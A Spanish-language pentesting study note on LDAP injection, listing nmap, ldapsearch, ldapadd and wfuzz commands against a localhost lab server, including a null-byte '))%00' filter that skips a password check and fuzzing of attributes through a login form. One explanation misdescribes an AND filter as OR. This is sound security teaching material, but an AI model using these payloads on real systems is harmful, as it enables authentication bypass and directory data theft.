
____

- Tags: 

___
# Definición 

La **inyección LDAP** es una técnica utilizada para aprovechar las vulnerabilidades en sistemas [[LDAP]] (Protocolo Ligero de Acceso a Directorios) con el fin de obtener información confidencial o realizar acciones no autorizadas. Aquí se presentan varios comandos útiles para la enumeración y exploración de un servidor [[LDAP]]:


____
# Enumeración de Servidor LDAP


```bash
nmap --script ldap* -p 389 ip
```

Este comando lanza todos los scripts de [[Nmap|nmap]] relacionados con [[LDAP]] a una [[Dirección IP|IP]] específica para enumerar diferentes aspectos, como el namming context.


```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

Realiza una búsqueda en un servidor [[LDAP]] local autenticándose como el usuario 'cn=admin,dc=example,dc=org' con la contraseña 'admin' y buscando una entrada con el atributo 'cn' igual a 'admin' en la base de búsqueda 'dc=example,dc=org'.

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP *))'
```

Realiza una búsqueda en un servidor [[LDAP]] local autenticándose como el usuario 'cn=admin,dc=example,dc=org' con la contraseña 'admin' y busca todas las entradas que cumplan con la condición de tener el atributo 'cn' igual a 'admin' y el atributo 'description' que comience con 'LDAP'.

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(|(cn=admin)(description=LDAP *))'
```

Realiza una búsqueda en un servidor [[LDAP]] local autenticándose como el usuario 'cn=admin,dc=example,dc=org' con la contraseña 'admin' y busca todas las entradas que cumplan con la condición de tener el atributo 'cn' igual a 'admin' o el atributo 'description' que comience con 'LDAP'.

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin))%00)(userPassword=*))'
```

Este comando verifica únicamente si el usuario es "admin", ya que al colocar "))%00" se comentan todas las verificaciones posteriores, quedando solo la verificación del nombre "admin".

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=a*)(description=*))'
```

Este comando busca en el servidor [[LDAP]] todas las entradas que cumplan las siguientes condiciones: el atributo cn comienza con a o el atributo description es cualquier valor.

```bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f archivo.ldif
```

Este comando se utiliza para agregar datos al servidor [[LDAP]] ubicado en localhost, utilizando la cuenta de administrador con nombre 'admin' y la contraseña 'admin', y tomando la información de un archivo 'archivo.ldif'.

```bash
wfuzz -c -w /usr/share/seclist/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=*)(FUZZ=*))%00&password=*&login=1&submit=Submit' ldap://localhost:8888
```

Este comando enumera todos los atributos disponibles en el servidor [[LDAP]] especificado.


Estos comandos son fundamentales para comprender la estructura y la seguridad de un servidor [[LDAP]] y pueden ser utilizados tanto para propósitos de auditoría como para identificar posibles vulnerabilidades. 